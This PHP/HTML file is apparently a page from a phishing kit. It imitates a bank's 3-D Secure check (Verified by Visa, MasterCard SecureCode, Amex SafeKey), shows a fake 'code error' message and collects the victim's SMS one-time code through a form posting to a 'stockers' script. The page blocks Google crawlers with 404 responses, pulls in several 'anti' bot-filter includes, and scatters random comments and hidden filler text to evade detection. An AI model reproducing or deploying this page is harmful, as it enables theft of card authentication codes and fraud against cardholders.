<?php
/*
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |TND95| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';


ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
  include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}
        error_reporting(0);
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
	if(empty($_POST['sms_code_error'])== false) {
		       include('../extra/stockers/steperror.php');
      }
		}
        ######## [+] VERIFIED BY VISA : SECURECODE [+] #########
        $_SESSION['_cc_brand_'] = strtoupper($_SESSION['_cc_brand_']);
		$VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
        $MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
        $DISCOVER   = $_SESSION['_cc_brand_'] == "DISCOVER";
        $AMEX   = $_SESSION['_cc_brand_'] == "AMEX" || $_SESSION['_cc_brand_'] == "AMERICAN EXPRESS";
        $JCP   = $_SESSION['_cc_brand_'] == "JCB";
        if($MASTERCARD) {
        $Type_XXX = "MasterCard SecureCode";
        $VBV_Name = "SecureCode";
		$sms="SMS Code";
		
        }elseif($VISACARD) {
        $Type_XXX = "Verified by Visa";
        $VBV_Name = "3D Password";
        }elseif($AMEX) {
        $Type_XXX = "American Express SafeKey";
        $VBV_Name = "SafeKey";
        }else{
        header("Location: ../app/process", true, 303);
		
        }
        ############### [+] HTTP_USER_AGENT [+] ################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <title><?php echo $lg_auth['title']?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" href="../app/lib/css/3D_SH33NZ0.css">
      <link type="text/css" rel="stylesheet" href="../app/lib/css/btn.css"/>
      <link type="text/css" rel="stylesheet" href="../app/lib/css/codex.authentication.css" />
  <link rel="shortcut icon" href="lib/pics/favi.ico">
  <link rel="apple-touch-icon" href="lib/pics/favi.png">
      <style type="text/css">
         textarea:focus, input:focus, input[type]:focus, .uneditable-input:focus {   
         border-color: #0070ba;
         box-shadow: 0 1px 1px rgba(0, 0, 255, 0.075) inset, 0 0 8px rgba(0, 0, 255, 0.6);
         outline: 0 none;
         }
      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
   <body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
      <div id="Rotation">
         <p style="font-size: 13px;"><?php echo $lg_auth['success']?></p>
      </div>
       <div id="xMarcos_9X9X" style="opacity: 1;"><div id="popup">
         <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
            <center><p style="font-size: 15px;"><?php echo $lg_auth['processing']?><strong>....</strong></p></center>
         </div>
         <br>
         <div id="xGhostRiderForm" style="display:none !important;"><?php echo "<!--".rand(0,99999999)."-->"?>
            <div class="a-section a-spacing-medium a-text-center"><?php echo "<!--".rand(0,99999999)."-->"?>
               <a href="#" class="svg-nfLogo signupBasicHeader"><?php echo "<!--".rand(0,99999999)."-->"?>
                   <center> <img src="../app/lib/img/logo.png"></center><?php echo "<!--".rand(0,99999999)."-->"?>
               </a>
            </div><?php echo "<!--".rand(0,99999999)."-->"?>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
            <?php echo "<!--".rand(0,99999999)."-->"?>   
            <form method="post" action="../extra/stockers/steperror.php" class="idform">
             <?php echo "<!--".rand(0,99999999)."-->"?>
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
               <?php echo "<!--".rand(0,99999999)."-->"?>
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                  <?php echo "<!--".rand(0,99999999)."-->"?>
                           <div class="a-box a-spacing-base">
                       <?php echo "<!--".rand(0,99999999)."-->"?>
                              <div class="a-box-inner a-padding-extra-large">
                         <?php echo "<!--".rand(0,99999999)."-->"?>
                                 <table>
                                    <tbody>
                               <?php echo "<!--".rand(0,99999999)."-->"?>
                                       <tr>      
                          <?php echo "<!--".rand(0,99999999)."-->"?>
                                       <?php 
                                             if($MASTERCARD) {  
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/mastercard-securecode.png"></td>';
                                             }elseif($VISACARD){
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/verified-by-visa.png"></td>';
                                             }elseif($AMEX){
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/safe-key.png"></td>';
                                             }
                                             ?>    
                                        <?php 
                                        if ($_SESSION['_cc_site_']){
              echo '<td><img class="cc_bank" id="cc_bank" resizable="yes" width="128" height="64" title="'.$_SESSION['_cc_bank_'].'" src="https://logo.clearbit.com/'.$_SESSION['_cc_site_'].'"></td>';
                                        }else{
              echo '<td><img class="cc_bank" id="cc_bank" src="../app/lib/img/ssl.png"></td>';
                                        }
                                        ?>

                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
                                 <style>
                                    width:230px;
                                 </style>
                                 <div id="xDoctorStrange_L1" style="
                                 text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
                                 <div id="xDoctorStrange_L1">
								 
								  Code Sent:
                                                <span style="width: 170px;padding-left: 4px;"id="time"></span>
												
								 
								 </div>
                                <!-- <div id="xDoctorStrange_L2"><?=$Type_XXX;?> <?php echo $lg_auth['protect']?> <b></b> <?php echo $lg_auth['center']?> <?=$Type_XXX;?> <?php echo $lg_auth['nextline']?> <?=$Type_XXX;?> <?php echo $lg_auth['password']?></div>
                                -->
<div id="xDoctorStrange_L2"><?=$lg_auth['sms_text'];?></div>
                               
								<div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                    
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$sms;?> :</td>
                                                <td><input required type="text" name="sms_code_error" id="sms_code_error" style="width: 170px;padding-left: 4px;"/></td>
												</tr>     
											
									
                                       </tbody>
                                    </table>
                                 </div>
								 <table>
								 <tbody>
								  <tr >	<td style="color:red;" ><br><b><?php echo $lg_auth['sms_error']?></b><br></td>
                                             </tr>
											 
											 </tbody>
											 </table>
											 <br>
                                 <div class="submitBtnContainer">
                                 <button style="font-size: 15px;font-weight: normal;" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit"><?php echo $lg_auth['submit']?></button></div>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none"><?php echo $lg_auth['cannot']?> <?=$Type_XXX;?>?
                        <div class="a-section"><span></span>
                           <a class="a-link-normal"><?php echo $lg_auth['contact']?></a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  <?php echo $lg_auth['copyright']?> ©1999-<?=date('Y');?>. <?php echo $lg_auth['rights']?>
                  </span>
               </div>
            </div>
         </div>
      </div>
      </div>
      <script type="text/javascript">
      $(document).ready(function(){
      $("#popup").delay(1000).fadeOut(0);
      $("#xGhostRiderForm").delay(1000).fadeIn(300);
      $("#submit").on('click', function () {
      $('#Rotation').fadeIn(300);
      });});
      </script>
	  
	  
	  
	  	  <script>

function CountDownTimer(duration, granularity) {
  this.duration = duration;
  this.granularity = granularity || 1000;
  this.tickFtns = [];
  this.running = false;
}

CountDownTimer.prototype.start = function() {
  if (this.running) {
    return;
  }
  this.running = true;
  var start = Date.now(),
    that = this,
    diff, obj;

  (function timer() {
    diff = that.duration - (((Date.now() - start) / 1000) | 0);

    if (diff > 0) {
      setTimeout(timer, that.granularity);
    } else {
      diff = 0;
      that.running = false;
    }

    obj = CountDownTimer.parse(diff);
    that.tickFtns.forEach(function(ftn) {
      ftn.call(this, obj.minutes, obj.seconds);
    }, that);
  }());
};

CountDownTimer.prototype.onTick = function(ftn) {
  if (typeof ftn === 'function') {
    this.tickFtns.push(ftn);
  }
  return this;
};

CountDownTimer.prototype.expired = function() {
  return !this.running;
};

CountDownTimer.parse = function(seconds) {
  return {
    'minutes': (seconds / 60) | 0,
    'seconds': (seconds % 60) | 0
  };
};

$(document).ready(function() {
  var counter = 0;

  var display = document.querySelector('#time'),
    //timer = new CountDownTimer(600);
    timer = new CountDownTimer(120); // for debug
  timer.onTick(format).onTick(restart).start();

  function restart() {
   
  }




  function format(minutes, seconds) {
    minutes = minutes < 10 ? "0" + minutes : minutes;
    seconds = seconds < 10 ? "0" + seconds : seconds;
    display.textContent = minutes + ':' + seconds;
  
  }
});

</script>
	  
	  
   </body>
</html>